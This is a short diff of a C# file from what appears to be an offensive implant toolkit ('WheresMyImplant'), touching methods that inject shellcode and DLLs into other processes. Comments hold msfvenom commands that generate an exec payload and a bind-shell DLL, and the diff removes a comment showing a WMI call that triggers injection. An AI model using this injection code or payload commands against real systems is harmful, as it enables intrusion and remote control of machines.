@@ -1,4 +1,6 @@
-﻿using System;
+﻿//http://www.codingvision.net/miscellaneous/c-inject-a-dll-into-a-process-w-createremotethread
+
+using System;
 using System.Management;
 
 using Tokenvator;
@@ -8,7 +10,6 @@ namespace WheresMyImplant
     public sealed class Injection
     {
         //msfvenom -p windows/x64/exec --format csharp CMD=calc.exe
-        //Invoke-CimMethod -Class Win32_Implant -Name InjectShellCode -Argument @{shellCodeString=$payload; processId=432}
         public static void InjectShellCode(String strProcessId, String shellCodeString)
         {
             Int32 dwProcessId = 0;
@@ -85,8 +86,7 @@ namespace WheresMyImplant
                 Console.WriteLine("[-] {0}", ex.ToString());
             }
         }
-
-        //http://www.codingvision.net/miscellaneous/c-inject-a-dll-into-a-process-w-createremotethread
+        
         //msfvenom -p windows/x64/shell_bind_tcp --format dll --arch x64 > /tmp/bind64.dll
         public static void LoadDll(String processId, String library)
         {
